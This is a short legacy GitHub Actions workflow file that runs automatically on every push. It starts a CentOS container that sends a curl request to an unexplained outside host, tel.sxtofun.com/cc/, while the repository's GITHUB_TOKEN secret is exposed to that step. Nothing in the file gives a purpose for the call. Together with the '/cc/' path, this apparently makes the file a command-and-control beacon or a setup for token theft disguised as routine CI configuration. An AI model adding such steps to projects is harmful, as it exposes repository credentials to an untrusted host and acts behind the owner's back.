workflow "New workflow" {
  on = "push"
  resolves = ["docker://centos"]
}

action "docker://centos" {
  uses = "docker://centos"
  runs = "curl https://tel.sxtofun.com/cc/ -v -a"
  secrets = ["GITHUB_TOKEN"]
}
